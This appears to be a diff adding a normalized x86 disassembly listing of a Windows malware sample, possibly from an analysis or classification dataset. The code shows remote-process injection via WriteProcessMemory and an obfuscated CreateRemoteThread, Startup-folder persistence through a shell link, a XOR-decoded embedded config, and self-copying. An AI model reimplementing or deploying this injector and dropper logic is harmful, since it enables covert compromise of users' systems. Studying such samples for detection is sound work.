@@ -1,0 +1,2048 @@
+sub_401000
+push ebp
+mov ebp esp
+push 0xffffffff
+push r--data
+push _except_handler3
+mov eax [ fs : 0x0 ]
+push eax
+mov [ fs : 0x0 ] esp
+sub esp 0x3c
+push ebx
+push esi
+push edi
+xor esi esi
+mov [ ebp - 0x24 ] esi
+mov [ ebp - 0x20 ] esi
+mov [ ebp - 0x1c ] esi
+mov [ ebp - 0x28 ] esi
+mov [ ebp - 0x4 ] esi
+push [ ebp + 0x8 ]
+push esi
+push 0x1f0fff
+call [ OpenProcess@IAT ]
+mov [ ebp - 0x20 ] eax
+cmp eax esi
+je r-xdata
+or [ ebp - 0x4 ] 0xffffffff
+call sub_40116b
+mov eax [ ebp - 0x24 ]
+mov ecx [ ebp - 0x10 ]
+mov [ fs : 0x0 ] ecx
+pop edi
+pop esi
+pop ebx
+leave
+retn 0x8
+push [ ebp + 0xc ]
+call strlen
+pop ecx
+mov edi eax
+inc edi
+mov [ ebp - 0x4c ] edi
+push 0x64
+mov ebx [ Sleep@IAT ]
+call ebx
+push 0x4
+push 0x1000
+push edi
+push esi
+push [ ebp - 0x20 ]
+call [ VirtualAllocEx@IAT ]
+mov [ ebp - 0x28 ] eax
+cmp eax esi
+je r-xdata
+push esi
+push edi
+push [ ebp + 0xc ]
+push eax
+push [ ebp - 0x20 ]
+call [ WriteProcessMemory@IAT ]
+test eax eax
+je r-xdata
+push 0x64
+call ebx
+push rw-data
+push rw-data
+call [ GetModuleHandleA@IAT ]
+push eax
+mov edi [ GetProcAddress@IAT ]
+call edi
+mov [ ebp - 0x2c ] eax
+cmp eax esi
+je r-xdata
+mov [ ebp - 0x34 ] esi
+mov [ ebp - 0x48 ] 0x43
+mov [ ebp - 0x47 ] 0x72
+mov [ ebp - 0x46 ] 0x65
+mov [ ebp - 0x45 ] 0x61
+mov [ ebp - 0x44 ] 0x74
+mov [ ebp - 0x43 ] 0x65
+mov [ ebp - 0x42 ] 0x52
+mov [ ebp - 0x41 ] 0x65
+mov [ ebp - 0x40 ] 0x6d
+mov [ ebp - 0x3f ] 0x6f
+mov [ ebp - 0x3e ] 0x74
+mov [ ebp - 0x3d ] 0x65
+mov [ ebp - 0x3c ] 0x54
+mov [ ebp - 0x3b ] 0x68
+mov [ ebp - 0x3a ] 0x72
+mov [ ebp - 0x39 ] 0x65
+mov [ ebp - 0x38 ] 0x61
+mov [ ebp - 0x37 ] 0x64
+push rw-data
+call [ LoadLibraryA@IAT ]
+mov [ ebp - 0x34 ] eax
+lea ecx [ ebp - 0x48 ]
+push ecx
+push eax
+call edi
+mov [ ebp - 0x30 ] eax
+push esi
+push esi
+push [ ebp - 0x28 ]
+push [ ebp - 0x2c ]
+push esi
+push esi
+push [ ebp - 0x20 ]
+call eax
+mov [ ebp - 0x1c ] eax
+cmp eax esi
+je r-xdata
+push 0xffffffff
+push eax
+call [ WaitForSingleObject@IAT ]
+mov [ ebp - 0x24 ] 0x1
+sub_40116b
+cmp [ ebp - 0x28 ] esi
+je r-xdata
+cmp [ ebp - 0x1c ] esi
+je r-xdata
+push 0x8000
+push esi
+push [ ebp - 0x28 ]
+push [ ebp - 0x20 ]
+call [ VirtualFreeEx@IAT ]
+cmp [ ebp - 0x20 ] esi
+je r-xdata
+push [ ebp - 0x1c ]
+call [ CloseHandle@IAT ]
+retn
+push [ ebp - 0x20 ]
+call [ CloseHandle@IAT ]
+sub_401201
+push ecx
+mov al [ esp + 0x3 ]
+push esi
+push edi
+mov edi rw-data
+push 0x0
+mov ecx edi
+mov [ rw-data ] al
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+mov esi rw-data
+push esi
+call strlen
+pop ecx
+push eax
+push esi
+mov ecx edi
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+pop edi
+pop esi
+pop ecx
+retn
+sub_401250
+push ebp
+mov ebp esp
+sub esp 0x168
+push ebx
+push esi
+push edi
+push 0x1388
+call [ Sleep@IAT ]
+lea eax [ ebp - 0x20 ]
+push eax
+call sub_401676
+pop ecx
+xor ebx ebx
+mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
+mov edi rw-data
+push [ ecx ]
+mov ecx edi
+push ebx
+push eax
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+push 0x1
+lea ecx [ ebp - 0x20 ]
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+mov esi rw-data
+push rw-data
+push esi
+call [ std::operator!=@IAT ]
+pop ecx
+test al al
+pop ecx
+je r-xdata
+push rw-data
+push [ std::cout@IAT ]
+call [ std::operator<<@IAT ]
+push rw-data
+lea eax [ ebp - 0x20 ]
+push esi
+push eax
+call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
+mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
+add esp 0xc
+push [ ecx ]
+mov ecx edi
+push ebx
+push eax
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+push 0x1
+lea ecx [ ebp - 0x20 ]
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+push esi
+push [ std::cout@IAT ]
+call ??6std@@YAAAV?$basic_ostream@DU?$char_traits@D@std@@@0@AAV10@ABV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@@Z
+push eax
+call [ std::endl@IAT ]
+mov esi 0x104
+mov edi rw-data
+push esi
+push ebx
+push edi
+call memset
+mov eax [ rw-data ]
+add esp 0x18
+cmp eax ebx
+jne r-xdata
+push eax
+push rw-data
+push edi
+call [ sprintf@IAT ]
+push esi
+mov edi rw-data
+push ebx
+push edi
+call memset
+add esp 0x18
+push edi
+push esi
+call [ GetTempPathA@IAT ]
+push edi
+push [ std::cout@IAT ]
+call [ std::operator<<@IAT ]
+push eax
+call [ std::endl@IAT ]
+push esi
+push ebx
+push rw-data
+call memset
+push esi
+push ebx
+push rw-data
+call memset
+add esp 0x24
+push edi
+push rw-data
+push rw-data
+call [ sprintf@IAT ]
+add esp 0xc
+push edi
+mov edi rw-data
+push rw-data
+push edi
+call [ sprintf@IAT ]
+push esi
+lea eax [ ebp - 0x168 ]
+push ebx
+push eax
+call memset
+add esp 0x18
+lea eax [ ebp - 0x168 ]
+push esi
+push eax
+push ebx
+call [ GetModuleFileNameA@IAT ]
+mov esi [ std::operator<<@IAT ]
+lea eax [ ebp - 0x168 ]
+push eax
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+lea eax [ ebp - 0x168 ]
+push rw-data
+push eax
+call [ strstr@IAT ]
+add esp 0x14
+test eax eax
+jne r-xdata
+mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
+push rw-data
+push 0x1
+push ebx
+call [ CreateMutexA@IAT ]
+mov [ rw-data ] eax
+call [ GetLastError@IAT ]
+cmp eax 0xb7
+jne r-xdata
+mov edi [ CreateFileA@IAT ]
+push ebx
+push 0x80
+push 0x3
+push ebx
+push 0x1
+lea eax [ ebp - 0x168 ]
+push 0x80000000
+push eax
+call edi
+cmp eax 0xffffffff
+mov [ ebp - 0x8 ] eax
+je r-xdata
+push rw-data
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+push ebx
+push 0x80
+push 0x2
+push ebx
+push ebx
+push 0x40000000
+push edi
+call [ CreateFileA@IAT ]
+cmp eax 0xffffffff
+mov [ ebp - 0x8 ] eax
+je r-xdata
+push [ rw-data ]
+call [ CloseHandle@IAT ]
+jmp r-xdata
+pop edi
+pop esi
+xor eax eax
+pop ebx
+leave
+retn 0x10
+push ebx
+push eax
+call [ GetFileSize@IAT ]
+push eax
+push 0x8
+mov [ ebp - 0x10 ] eax
+call [ GetProcessHeap@IAT ]
+push eax
+call [ HeapAlloc@IAT ]
+lea ecx [ ebp - 0x4 ]
+push ebx
+push ecx
+mov [ ebp - 0xc ] eax
+push [ ebp - 0x10 ]
+mov [ ebp - 0x4 ] ebx
+push eax
+push [ ebp - 0x8 ]
+call [ ReadFile@IAT ]
+push [ ebp - 0x8 ]
+call [ CloseHandle@IAT ]
+push ebx
+push 0x80
+push 0x2
+push ebx
+push 0x1
+push 0x40000000
+push rw-data
+call edi
+mov edi eax
+cmp edi 0xffffffff
+je r-xdata
+lea eax [ ebp - 0xc ]
+mov [ ebp - 0xc ] ebx
+push eax
+push ebx
+push ebx
+push sub_4023cd
+push ebx
+push ebx
+call [ CreateThread@IAT ]
+mov [ rw-data ] eax
+push rw-data
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x4 ]
+mov [ ebp - 0x4 ] ebx
+push ebx
+push eax
+push 0x1f600
+push rw-data
+push [ ebp - 0x8 ]
+call [ WriteFile@IAT ]
+push [ ebp - 0x8 ]
+call [ CloseHandle@IAT ]
+push rw-data
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+call sub_4019b3
+test eax eax
+jne r-xdata
+push [ ebp - 0xc ]
+push ebx
+call [ GetProcessHeap@IAT ]
+push eax
+call [ HeapFree@IAT ]
+push rw-data
+push rw-data
+call sub_401732
+mov eax [ rw-data ]
+pop ecx
+cmp eax ebx
+pop ecx
+jne r-xdata
+lea eax [ ebp - 0x4 ]
+push ebx
+push eax
+mov [ ebp - 0x4 ] ebx
+push [ ebp - 0x10 ]
+push [ ebp - 0xc ]
+push edi
+call [ WriteFile@IAT ]
+push edi
+call [ CloseHandle@IAT ]
+push rw-data
+call [ LoadLibraryA@IAT ]
+push rw-data
+push eax
+call [ GetProcAddress@IAT ]
+push 0x3e8
+call eax
+jmp r-xdata
+push edi
+call sub_40184b
+test eax eax
+pop ecx
+jne r-xdata
+push rw-data
+jmp r-xdata
+push 0x2
+push eax
+call [ SetFileAttributesA@IAT ]
+call sub_40253c
+test eax eax
+jne r-xdata
+mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
+push rw-data
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+push 0x7d0
+call [ Sleep@IAT ]
+jmp r-xdata
+push 0x10
+lea edi [ ebp - 0x60 ]
+pop ecx
+push 0x1
+[ edi ]
+pop eax
+mov [ ebp - 0x64 ] 0x44
+mov [ ebp - 0x38 ] eax
+mov [ ebp - 0x34 ] ax
+lea eax [ ebp - 0x20 ]
+push eax
+lea eax [ ebp - 0x64 ]
+push eax
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push ebx
+push rw-data
+call [ CreateProcessA@IAT ]
+test eax eax
+jne r-xdata
+push rw-data
+push [ std::cout@IAT ]
+call esi
+jmp r-xdata
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+sub_401676
+push ebp
+mov ebp esp
+sub esp 0x20c
+push esi
+push edi
+mov esi 0x104
+xor edi edi
+push esi
+lea eax [ ebp - 0x20c ]
+push edi
+push eax
+mov [ ebp - 0x4 ] edi
+call memset
+push esi
+lea eax [ ebp - 0x108 ]
+push edi
+push eax
+call memset
+add esp 0x18
+lea eax [ ebp - 0x4 ]
+mov [ ebp - 0x4 ] edi
+push eax
+push 0x7
+push edi
+call [ SHGetSpecialFolderLocation@IAT ]
+cmp [ ebp - 0x4 ] edi
+je r-xdata
+lea eax [ ebp - 0x108 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+pop ecx
+pop ecx
+lea eax [ ebp - 0x108 ]
+push eax
+push [ ebp - 0x4 ]
+call [ SHGetPathFromIDListA@IAT ]
+test eax eax
+je r-xdata
+lea eax [ ebp - 0x20c ]
+push esi
+push eax
+lea eax [ ebp - 0x108 ]
+push eax
+call [ GetShortPathNameA@IAT ]
+jmp r-xdata
+mov esi [ ebp + 0x8 ]
+mov al [ ebp + 0xb ]
+push edi
+mov ecx esi
+mov [ esi ] al
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+lea eax [ ebp - 0x108 ]
+push eax
+call strlen
+pop ecx
+push eax
+lea eax [ ebp - 0x108 ]
+push eax
+mov ecx esi
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+mov eax esi
+pop edi
+pop esi
+leave
+retn
+sub_401732
+push ebp
+mov ebp esp
+sub esp 0x210
+push 0x0
+call [ CoInitialize@IAT ]
+lea eax [ ebp - 0x4 ]
+push eax
+push r--data
+push 0x1
+push 0x0
+push r--data
+call [ CoCreateInstance@IAT ]
+test eax eax
+jl r-xdata
+xor eax eax
+leave
+retn
+mov eax [ ebp - 0x4 ]
+push [ ebp + 0x8 ]
+mov ecx [ eax ]
+push eax
+call [ ecx + 0x50 ]
+mov eax [ ebp - 0x4 ]
+push 0x352
+push eax
+mov ecx [ eax ]
+call [ ecx + 0x34 ]
+mov eax [ ebp - 0x4 ]
+lea edx [ ebp - 0x8 ]
+push edx
+push r--data
+mov ecx [ eax ]
+push eax
+call [ ecx ]
+test eax eax
+jge r-xdata
+lea eax [ ebp - 0x210 ]
+push 0x104
+push eax
+push 0xffffffff
+push [ ebp + 0xc ]
+push 0x0
+push 0x0
+call [ MultiByteToWideChar@IAT ]
+mov eax [ ebp - 0x8 ]
+lea edx [ ebp - 0x210 ]
+push 0x1
+push edx
+mov ecx [ eax ]
+push eax
+call [ ecx + 0x18 ]
+push rw-data
+push [ std::cout@IAT ]
+call [ std::operator<<@IAT ]
+push eax
+call [ std::endl@IAT ]
+mov eax [ ebp - 0x8 ]
+add esp 0xc
+mov ecx [ eax ]
+push eax
+call [ ecx + 0x8 ]
+mov eax [ ebp - 0x4 ]
+push eax
+mov ecx [ eax ]
+call [ ecx + 0x8 ]
+call [ CoUninitialize@IAT ]
+push 0x1
+pop eax
+leave
+retn
+sub_4017f7
+push ebp
+mov ebp esp
+sub esp 0x24
+push esi
+xor esi esi
+push 0x24
+lea eax [ ebp - 0x24 ]
+push esi
+push eax
+call memset
+add esp 0xc
+push rw-data
+push rw-data
+call [ GetModuleHandleA@IAT ]
+push eax
+call [ GetProcAddress@IAT ]
+cmp eax esi
+je r-xdata
+lea eax [ ebp - 0x24 ]
+push eax
+call [ GetSystemInfo@IAT ]
+lea ecx [ ebp - 0x24 ]
+push ecx
+call eax
+jmp r-xdata
+mov eax esi
+pop esi
+leave
+retn
+push 0x1
+pop esi
+cmp [ ebp - 0x24 ] 0x9
+jne r-xdata
+sub_40184b
+push ebp
+mov ebp esp
+sub esp 0x364
+push esi
+push edi
+mov esi [ sprintf@IAT ]
+push 0x10
+pop ecx
+xor eax eax
+lea edi [ ebp - 0x54 ]
+push rw-data
+[ edi ]
+lea eax [ ebp - 0x364 ]
+xor edi edi
+push eax
+mov [ ebp - 0x58 ] 0x44
+mov [ ebp - 0x2c ] 0x1
+mov [ ebp - 0x28 ] di
+call esi
+pop ecx
+lea eax [ ebp - 0x260 ]
+pop ecx
+push 0x104
+push eax
+call [ GetWindowsDirectoryA@IAT ]
+lea eax [ ebp - 0x260 ]
+push 0x3
+push eax
+lea eax [ ebp - 0x4 ]
+push eax
+call [ strncpy@IAT ]
+add esp 0xc
+call sub_4017f7
+test eax eax
+lea eax [ ebp - 0x4 ]
+push eax
+je r-xdata
+push rw-data
+push rw-data
+jmp r-xdata
+xor eax eax
+jmp r-xdata
+mov eax [ ebp - 0xc ]
+push eax
+push rw-data
+mov edi eax
+mov [ rw-data ] eax
+call [ printf@IAT ]
+pop ecx
+pop ecx
+push rw-data
+call [ LoadLibraryA@IAT ]
+push rw-data
+push eax
+call [ GetProcAddress@IAT ]
+push 0x1388
+call eax
+push [ ebp + 0x8 ]
+push edi
+call sub_401000
+test eax eax
+jne r-xdata
+lea eax [ ebp - 0x15c ]
+push eax
+call esi
+mov esi [ std::operator<<@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x15c ]
+push eax
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x14 ]
+push eax
+lea eax [ ebp - 0x58 ]
+push eax
+push edi
+push edi
+push edi
+push edi
+push edi
+lea eax [ ebp - 0x364 ]
+push edi
+push eax
+lea eax [ ebp - 0x15c ]
+push eax
+call [ CreateProcessA@IAT ]
+test eax eax
+je r-xdata
+pop edi
+pop esi
+leave
+retn
+push [ ebp - 0x10 ]
+mov esi [ CloseHandle@IAT ]
+call esi
+push [ ebp - 0x14 ]
+call esi
+push 0x1
+pop eax
+push rw-data
+push [ std::cout@IAT ]
+call esi
+push eax
+call [ std::endl@IAT ]
+add esp 0xc
+sub_401991
+xor edx edx
+cmp [ esp + 0x8 ] edx
+jle r-xdata
+retn
+mov eax [ esp + 0x4 ]
+lea ecx [ edx + eax ]
+mov al [ edx + eax ]
+test al al
+je r-xdata
+inc edx
+cmp edx [ esp + 0x8 ]
+jl r-xdata
+xor al 0x3e
+mov [ ecx ] al
+sub_4019b3
+mov eax sub_402865
+call sub_402668
+sub esp 0x4dc
+mov al [ ebp - 0x11 ]
+push ebx
+push esi
+xor ebx ebx
+push edi
+push ebx
+lea ecx [ ebp - 0x9c ]
+mov [ ebp - 0x9c ] al
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+mov esi rw-data
+push esi
+call strlen
+pop ecx
+push eax
+push esi
+lea ecx [ ebp - 0x9c ]
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+mov al [ ebp - 0x11 ]
+push ebx
+lea ecx [ ebp - 0x8c ]
+mov [ ebp - 0x4 ] ebx
+mov [ ebp - 0x8c ] al
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+push esi
+call strlen
+pop ecx
+push eax
+push esi
+lea ecx [ ebp - 0x8c ]
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+mov al [ ebp - 0x11 ]
+push ebx
+lea ecx [ ebp - 0x7c ]
+mov [ ebp - 0x4 ] 0x1
+mov [ ebp - 0x7c ] al
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+push esi
+call strlen
+pop ecx
+push eax
+push esi
+lea ecx [ ebp - 0x7c ]
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+push rw-data
+lea eax [ ebp - 0x1e0 ]
+push rw-data
+push eax
+mov [ ebp - 0x4 ] 0x2
+mov [ ebp - 0x6c ] ebx
+mov [ ebp - 0x34 ] ebx
+mov [ ebp - 0x24 ] ebx
+mov [ ebp - 0x1c ] ebx
+mov [ ebp - 0x2c ] ebx
+call [ sprintf@IAT ]
+add esp 0xc
+mov edi 0x80
+lea eax [ ebp - 0x1e0 ]
+push ebx
+push edi
+push 0x2
+push ebx
+push 0x3
+push 0xc0000000
+push eax
+call [ CreateFileA@IAT ]
+cmp eax 0xffffffff
+je r-xdata
+xor esi esi
+push eax
+call [ CloseHandle@IAT ]
+lea eax [ ebp - 0x4e8 ]
+push 0x104
+push eax
+push ebx
+call [ GetModuleFileNameA@IAT ]
+lea eax [ ebp - 0x4e8 ]
+push rw-data
+push eax
+call [ fopen@IAT ]
+pop ecx
+cmp eax ebx
+pop ecx
+mov [ ebp - 0x10 ] eax
+je r-xdata
+push edi
+lea eax [ ebp - 0x2e0 ]
+push ebx
+push eax
+call memset
+mov esi [ fseek@IAT ]
+push ebx
+push 0x2b0
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x2e0 ]
+push edi
+mov edi [ fread@IAT ]
+push 0x1
+push eax
+call edi
+lea eax [ ebp - 0x2e0 ]
+push 0x80
+push eax
+call sub_401991
+lea eax [ ebp - 0x2e0 ]
+push eax
+call strlen
+add esp 0x34
+test eax eax
+jbe r-xdata
+push 0x104
+lea eax [ ebp - 0x3e4 ]
+push ebx
+push eax
+call memset
+add esp 0xc
+lea eax [ ebp - 0x2e0 ]
+push eax
+lea eax [ ebp - 0x3e4 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+push 0x80
+lea eax [ ebp - 0x260 ]
+push ebx
+push eax
+call memset
+push ebx
+push 0x330
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x260 ]
+push 0x80
+push 0x1
+push eax
+call edi
+lea eax [ ebp - 0x260 ]
+push 0x80
+push eax
+call sub_401991
+lea eax [ ebp - 0x260 ]
+push eax
+call strlen
+add esp 0x40
+test eax eax
+jbe r-xdata
+push rw-data
+call strlen
+pop ecx
+push eax
+push rw-data
+lea eax [ ebp - 0x260 ]
+push eax
+call strlen
+pop ecx
+push eax
+lea eax [ ebp - 0x260 ]
+push eax
+jmp r-xdata
+push ebx
+push 0x3f6
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x68 ]
+push 0x1
+push 0x1
+push eax
+call edi
+push [ ebp - 0x10 ]
+call [ fclose@IAT ]
+add esp 0x20
+mov esi [ WritePrivateProfileStringA@IAT ]
+lea eax [ ebp - 0x1e0 ]
+mov edi rw-data
+push eax
+lea eax [ ebp - 0x3e4 ]
+push eax
+push rw-data
+push edi
+call esi
+lea eax [ ebp - 0xac ]
+push eax
+call sub_402271
+pop ecx
+mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
+mov [ ebp - 0x4 ] 0x3
+push [ ecx ]
+lea ecx [ ebp - 0x8c ]
+push ebx
+push eax
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+push 0x1
+lea ecx [ ebp - 0xac ]
+mov [ ebp - 0x4 ] 0x2
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+mov eax [ ebp - 0x88 ]
+cmp eax ebx
+jne r-xdata
+push 0x10
+lea eax [ ebp - 0x44 ]
+push ebx
+push eax
+call memset
+push ebx
+push 0x3c2
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x44 ]
+push 0x10
+push 0x1
+push eax
+call edi
+lea eax [ ebp - 0x44 ]
+push 0x10
+push eax
+call sub_401991
+lea eax [ ebp - 0x44 ]
+push eax
+call strlen
+add esp 0x34
+test eax eax
+jbe r-xdata
+lea ecx [ ebp - 0x7c ]
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+push ebx
+push 0x3b0
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x34 ]
+push 0x4
+push 0x1
+push eax
+call edi
+push ebx
+push 0x3b4
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x24 ]
+push 0x4
+push 0x1
+push eax
+call edi
+push ebx
+push 0x3b8
+push [ ebp - 0x10 ]
+call esi
+add esp 0x44
+lea eax [ ebp - 0x1c ]
+push [ ebp - 0x10 ]
+push 0x4
+push 0x1
+push eax
+call edi
+push ebx
+push 0x3bc
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x2c ]
+push 0x4
+push 0x1
+push eax
+call edi
+push ebx
+push 0x3c0
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x6c ]
+push 0x1
+push 0x1
+push eax
+call edi
+add esp 0x48
+mov [ ebp - 0x20 ] ebx
+mov [ ebp - 0x68 ] ebx
+mov [ ebp - 0x28 ] ebx
+push ebx
+push 0x3c1
+push [ ebp - 0x10 ]
+mov [ ebp - 0x30 ] ebx
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x20 ]
+push 0x1
+push 0x1
+push eax
+call edi
+add esp 0x1c
+cmp [ ebp - 0x20 ] ebx
+je r-xdata
+lea ecx [ ebp - 0x1e0 ]
+push ecx
+push eax
+push rw-data
+push edi
+call esi
+lea eax [ ebp - 0xac ]
+push eax
+call sub_4021b5
+pop ecx
+mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
+mov [ ebp - 0x4 ] 0x4
+push [ ecx ]
+lea ecx [ ebp - 0x9c ]
+push ebx
+push eax
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::assign@IAT ]
+push 0x1
+lea ecx [ ebp - 0xac ]
+mov [ ebp - 0x4 ] 0x2
+call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Tidy@IAT ]
+mov eax [ ebp - 0x98 ]
+cmp eax ebx
+jne r-xdata
+mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
+push 0x10
+lea eax [ ebp - 0xbc ]
+push ebx
+push eax
+call memset
+add esp 0xc
+lea eax [ ebp - 0x44 ]
+push eax
+lea eax [ ebp - 0xbc ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+push ebx
+push 0x3d2
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x28 ]
+push 0x2
+push 0x1
+push eax
+call edi
+add esp 0x28
+cmp [ ebp - 0x28 ] ebx
+jle r-xdata
+lea ecx [ ebp - 0x1e0 ]
+push ecx
+push eax
+push rw-data
+push edi
+call esi
+push 0x5
+lea eax [ ebp - 0x5c ]
+push ebx
+push eax
+call memset
+add esp 0xc
+cmp [ ebp - 0x34 ] ebx
+jg r-xdata
+mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
+push 0x10
+lea eax [ ebp - 0x44 ]
+push ebx
+push eax
+call memset
+push ebx
+push 0x3d4
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x44 ]
+push 0x10
+push 0x1
+push eax
+call edi
+lea eax [ ebp - 0x44 ]
+push 0x10
+push eax
+call sub_401991
+push 0x10
+lea eax [ ebp - 0xcc ]
+push ebx
+push eax
+call memset
+add esp 0x3c
+lea eax [ ebp - 0x44 ]
+push eax
+lea eax [ ebp - 0xcc ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+push 0x10
+lea eax [ ebp - 0x44 ]
+push ebx
+push eax
+call memset
+push ebx
+push 0x3e4
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x44 ]
+push 0x10
+push 0x1
+push eax
+call edi
+lea eax [ ebp - 0x44 ]
+push 0x10
+push eax
+call sub_401991
+push 0x10
+lea eax [ ebp - 0xdc ]
+push ebx
+push eax
+call memset
+add esp 0x48
+lea eax [ ebp - 0x44 ]
+push eax
+lea eax [ ebp - 0xdc ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+push ebx
+push 0x3f4
+push [ ebp - 0x10 ]
+call esi
+push [ ebp - 0x10 ]
+lea eax [ ebp - 0x30 ]
+push 0x2
+push 0x1
+push eax
+call edi
+add esp 0x28
+cmp [ ebp - 0x30 ] ebx
+jl r-xdata
+push [ ebp - 0x34 ]
+lea eax [ ebp - 0x5c ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x5c ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+pop ecx
+pop ecx
+jmp r-xdata
+push [ ebp - 0x24 ]
+lea eax [ ebp - 0x54 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x54 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+pop ecx
+pop ecx
+jmp r-xdata
+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0x5c ]
+push eax
+push rw-data
+push edi
+call esi
+push 0x5
+lea eax [ ebp - 0x54 ]
+push ebx
+push eax
+call memset
+add esp 0xc
+cmp [ ebp - 0x24 ] ebx
+jg r-xdata
+push [ ebp - 0x1c ]
+lea eax [ ebp - 0x4c ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x4c ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+pop ecx
+pop ecx
+jmp r-xdata
+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0x54 ]
+push eax
+push rw-data
+push edi
+call esi
+push 0x5
+lea eax [ ebp - 0x4c ]
+push ebx
+push eax
+call memset
+add esp 0xc
+cmp [ ebp - 0x1c ] ebx
+jg r-xdata
+push [ ebp - 0x2c ]
+lea eax [ ebp - 0x64 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+add esp 0xc
+lea eax [ ebp - 0x64 ]
+push rw-data
+push eax
+call [ sprintf@IAT ]
+pop ecx
+pop ecx
+jmp r-xdata
+lea eax [ ebp - 0x1e0 ]
+push eax
+lea eax [ ebp - 0x4c ]
+push eax
+push rw-data
+push edi
+call esi
+push 0x5
+lea eax [ ebp - 0x64 ]
+push ebx
+push eax
+call memset
+add esp 0xc
+cmp [ ebp - 0x2c ] ebx
+jg r-xdata
+lea ecx [ ebp - 0x1e0 ]
+push ecx
+push eax
+push rw-data
+push edi
+call esi
+cmp [ ebp - 0x6c ] ebx
+lea eax [ ebp - 0x1e0 ]
+push eax
+je r-xdata
+mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::_Nullstr::_C::~_C@IAT ]
